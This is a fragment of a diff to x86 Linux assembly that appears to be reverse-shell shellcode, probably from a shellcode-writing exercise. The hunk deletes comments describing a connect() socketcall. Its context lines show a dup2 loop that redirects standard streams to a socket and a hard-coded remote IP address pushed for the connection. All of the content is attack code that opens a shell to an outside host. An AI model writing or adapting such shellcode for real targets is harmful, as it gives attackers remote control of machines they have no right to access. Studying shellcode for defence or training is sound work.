@@ -23,15 +23,6 @@ dup_jump:
 	dec ecx				; decrement ecx from stderror to stdin
 	jns dup_jump			; loop until ZF is set
 
-	; 3 - connect
-	; int connect(int sockfd, const struct sockaddr *addr[sin_family, sin_port, sin_addr], socklen_t addrlen)
-	; eax = connect(socketfd, [2, port, IP], 16)
-	; returns 0 on success
-
-	; eax = 0x66 = socketcall()
-        ; ebx = 0x3 = connect()
-        ; ecx = ptr to bind's args
-
         mov al, 0x66                    ; 0x66 = 102 = socketcall()
 
 	push dword 0x80f1a8c0          	; 192.168.241.128 Remote IP address
